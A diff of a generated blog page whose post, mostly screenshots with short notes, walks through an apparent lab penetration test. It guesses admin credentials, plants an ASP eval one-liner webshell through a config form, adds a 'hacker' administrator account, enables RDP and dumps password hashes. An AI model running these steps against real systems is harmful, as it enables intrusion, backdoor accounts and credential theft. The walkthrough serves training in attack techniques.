@@ -234,7 +234,7 @@
     </button>
 
     <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn">
-        <ol class="post-toc"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#一次虚拟渗透提权"><span class="post-toc-number">1.</span> <span class="post-toc-text">一次虚拟渗透提权</span></a></li></ol>
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#undefined"><span class="post-toc-number">1.</span> <span class="post-toc-text">一次虚拟渗透提权</span></a></li></ol>
 
         <!--
         <li class="mdl-menu__item">
@@ -326,6 +326,17 @@
     
 
     
+        
+            <!-- Busuanzi Views -->
+            <a class="post_share-link" href="#">
+                <li class="mdl-menu__item">
+                    <span id="busuanzi_container_page_pv">
+                        <span id="busuanzi_value_page_pv"></span>&nbsp;浏览量
+                    </span>
+                </li>
+            </a>
+        
+    
 
     <!-- Share Weibo -->
     
@@ -338,35 +349,29 @@
 
     <!-- Share Twitter -->
     
-        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=我很简单，不要欺负我&url=http://yoursite.com//2016/10/16/我很简单，不要欺负我/index.html&via=George Lee" target="_blank">
-            <li class="mdl-menu__item">
-                分享到 Twitter
-            </li>
-        </a>
-    
 
     <!-- Share Facebook -->
-    
-        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com//2016/10/16/我很简单，不要欺负我/index.html" target="_blank">
-            <li class="mdl-menu__item">
-                分享到 Facebook
-            </li>
-        </a>
     
 
     <!-- Share Google+ -->
     
-        <a class="post_share-link" href="https://plus.google.com/share?url=http://yoursite.com//2016/10/16/我很简单，不要欺负我/index.html" target="_blank">
+
+    <!-- Share LinkedIn -->
+    
+        <a class="post_share-link" href="https://www.linkedin.com/shareArticle?mini=true&url=http://yoursite.com//2016/10/16/我很简单，不要欺负我/index.html&title=我很简单，不要欺负我" target="_blank">
             <li class="mdl-menu__item">
-                分享到 Google+
+                分享到 LinkedIn
             </li>
         </a>
     
 
-    <!-- Share LinkedIn -->
-    
-
     <!-- Share QQ -->
+    
+        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=凡尘&title=我很简单，不要欺负我&summary=Nothing is difficult to the man who will try.&pics=http://yoursite.com/img/favicon.png&url=http://yoursite.com/2016/10/16/我很简单，不要欺负我/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 QQ
+            </li>
+        </a>
     
 
     <!-- Share Telegram -->
@@ -380,28 +385,31 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <h4 id="一次虚拟渗透提权"><a href="#一次虚拟渗透提权" class="headerlink" title="一次虚拟渗透提权"></a>一次虚拟渗透提权</h4><p><strong>1、</strong>查看环境</p>
+        <h4>一次虚拟渗透提权</h4>
+<p>**1、**查看环境</p>
 <p><img src="http://obh16g4rw.bkt.clouddn.com/11.png" alt=""></p>
-<p><strong>2、</strong>御剑扫目录<br><a id="more"></a></p>
+<p>**2、**御剑扫目录
+&lt;!--more--&gt;</p>
 <p><img src="http://obh16g4rw.bkt.clouddn.com/12.png" alt=""></p>
 <p>发现/admin目录</p>
-<p><strong>3、</strong>明小子爆破密码</p>
+<p>**3、**明小子爆破密码</p>
 <p><img src="http://obh16g4rw.bkt.clouddn.com/13.png" alt=""></p>
 <p><img src="http://obh16g4rw.bkt.clouddn.com/15.png" alt=""></p>
 <p><img src="http://obh16g4rw.bkt.clouddn.com/16.png" alt=""></p>
 <p>解密admin/admin888</p>
-<p><strong>4、</strong>上传一句话</p>
+<p>**4、**上传一句话</p>
 <p><img src="http://obh16g4rw.bkt.clouddn.com/17.png" alt=""></p>
-<p>上传木马一句话（点击左侧菜单栏中的 [系统设置管理]–&gt;[网站信息配置]，用修改配置文件的方法获取WebShell）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&quot;%&gt;&lt;%Eval Request(Chr(35))%&gt;&lt;%&apos;</div></pre></td></tr></table></figure>
+<p>上传木马一句话（点击左侧菜单栏中的 [系统设置管理]--&gt;[网站信息配置]，用修改配置文件的方法获取WebShell）</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&quot;%&gt;&lt;%Eval Request(Chr(35))%&gt;&lt;%&apos;</div></pre></td></tr></table></figure></p>
 <p>chr(35)是#的asscill值。如若修改成功，公司名称回显示空白</p>
-<p><strong>5、</strong>菜刀连接</p>
+<p>**5、**菜刀连接</p>
 <p><img src="http://obh16g4rw.bkt.clouddn.com/18.png" alt=""></p>
-<p>修改后的公司名称路径为<a href="http://www.test.ichunqiu/inc/config.asp" target="_blank" rel="external">http://www.test.ichunqiu/inc/config.asp</a></p>
+<p>修改后的公司名称路径为http://www.test.ichunqiu/inc/config.asp</p>
 <p>因为我们刚才修改的是网站信息配置页面就是这个路径，当然密码也是可以自己修改的，只要匹配就可以</p>
 <p><img src="http://obh16g4rw.bkt.clouddn.com/19.png" alt=""></p>
-<p><strong>6、</strong>提权</p>
-<p>在这个目录下我们上传cmd.exe pe.exe 3389.bat quarkPwDump.exe<br>是为了提权，拿到管理员的hash</p>
+<p>**6、**提权</p>
+<p>在这个目录下我们上传cmd.exe pe.exe 3389.bat quarkPwDump.exe
+是为了提权，拿到管理员的hash</p>
 <p>提权工具包括pr，3389，cmd，</p>
 <p>路径：C:\Tools\提权工具\windows</p>
 <p>C:\tools\hashQuarkPwDump</p>
@@ -409,15 +417,15 @@
 <p><img src="http://obh16g4rw.bkt.clouddn.com/20.png" alt=""></p>
 <p><img src="http://obh16g4rw.bkt.clouddn.com/21.png" alt=""></p>
 <ol>
-<li>pr “net user hacker 123 /add”</li>
-<li>pr “net localgroup administrators hacker /add”</li>
+<li>pr &quot;net user hacker 123 /add&quot;</li>
+<li>pr &quot;net localgroup administrators hacker /add&quot;</li>
 <li>pr 3389</li>
 </ol>
 <p><img src="http://obh16g4rw.bkt.clouddn.com/22.png" alt=""></p>
 <p>好了，连接服务器：172.16.12.2/hacker-123</p>
 <p><img src="http://obh16g4rw.bkt.clouddn.com/24.png" alt=""></p>
 <p><img src="http://obh16g4rw.bkt.clouddn.com/25.png" alt=""></p>
-<p>QuarksPwDump –dump-hash-local</p>
+<p>QuarksPwDump --dump-hash-local</p>
 <p><img src="http://obh16g4rw.bkt.clouddn.com/26.png" alt=""></p>
 <p><a href="http://www.objectif-securite.ch/en/ophcrack.php" title="hash解密" target="_blank" rel="external">hash解密</a></p>
 
@@ -633,29 +641,11 @@ It will not impact the appearance and can give developers a lot of support :)
         <div class="mdl-mini-footer--left-section sns-list">
     <!-- Twitter -->
     
-        <a href="https://twitter.com/twitter" target="_blank">
-            <button class="mdl-mini-footer--social-btn social-btn" style="background-image: url(/img/footer/footer_ico-twitter.png);">
-                <span class="visuallyhidden">Twitter</span>
-            </button><!--
-     --></a>
-    
 
     <!-- Facebook -->
     
-        <a href="https://www.facebook.com/facebook" target="_blank">
-            <button class="mdl-mini-footer--social-btn social-btn" style="background-image: url(/img/footer/footer_ico-facebook.png);">
-                <span class="visuallyhidden">Facebook</span>
-            </button><!--
-     --></a>
-    
 
     <!-- Google + -->
-    
-        <a href="https://www.google.com/" target="_blank">
-            <button class="mdl-mini-footer--social-btn social-btn" style="background-image: url(/img/footer/footer_ico-gplus.png);">
-                <span class="visuallyhidden">Google Plus</span>
-            </button><!--
-     --></a>
     
 
     <!-- Weibo -->
@@ -674,6 +664,12 @@ It will not impact the appearance and can give developers a lot of support :)
     
 
     <!-- Github -->
+    
+        <a href="https://github.com/dropslzx" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn" style="background-image: url(/img/footer/footer_ico-github.png);">
+                <span class="visuallyhidden">Github</span>
+            </button><!--
+     --></a>
     
 
     <!-- LinkedIn -->
@@ -753,6 +749,9 @@ It will not impact the appearance and can give developers a lot of support :)
 
 
 
+
+    <!-- Busuanzi -->
+    <script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
 
 
